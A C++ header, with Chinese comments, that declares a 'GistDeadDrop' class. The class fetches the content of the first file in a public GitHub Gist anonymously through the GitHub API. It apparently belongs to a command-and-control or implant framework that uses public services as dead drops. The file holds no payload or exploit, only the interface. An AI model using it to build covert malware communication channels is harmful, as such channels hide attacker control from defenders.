/**
 * @file GistDeadDrop.hpp
 * @details
 * 平台形态(mock 对齐): GET <api_url> → 200 {"files": {"<name>": {"content": "..."}}}
 * —— 单 file 场景取**第一个 file 的 content**(Gist 的 files 是 map, 名字任意)。
 *
 * 请求头: User-Agent 必填(GitHub API 缺 UA 直接 403), 经 IHttpOps headers 参数
 * 透传(4.0.1)。无认证 token —— 公开 Gist 匿名读。
 */
#pragma once

#include "Core/Exchange/IDeadDrop.hpp"
#include "Core/Comms/Platform/IHttpOps.hpp"

#include <string>

namespace cleat {
namespace deaddrop {

    class GistDeadDrop : public IDeadDrop {
    public:
        /// @param http  通道层引用(调用者, 不拥有)
        /// @param apiUrl 完整 Gist API 地址(含 gist id), mock 时指向本地服务
        GistDeadDrop(IHttpOps& http, std::string apiUrl, int timeoutMs = 10000);

        std::optional<std::string> FetchRaw() override;
        std::string PlatformName() const override { return "gist"; }

    private:
        IHttpOps& http_;
        std::string apiUrl_;
        int timeoutMs_;
    };

} // namespace deaddrop
} // namespace cleat
